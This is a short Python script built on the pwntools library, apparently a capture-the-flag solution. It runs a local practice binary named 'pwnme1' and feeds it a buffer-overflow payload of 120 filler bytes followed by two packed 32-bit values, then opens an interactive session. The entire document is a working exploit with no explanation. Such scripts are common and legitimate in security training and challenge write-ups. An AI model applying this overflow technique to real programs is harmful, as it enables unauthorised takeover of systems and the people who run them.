from pwn import *

p = process('./pwnme1')

payload  = b'A' * 120
payload += p32(0x0000b4be)
payload += p32(0x00f47b47)

p.sendline(payload)
p.interactive()
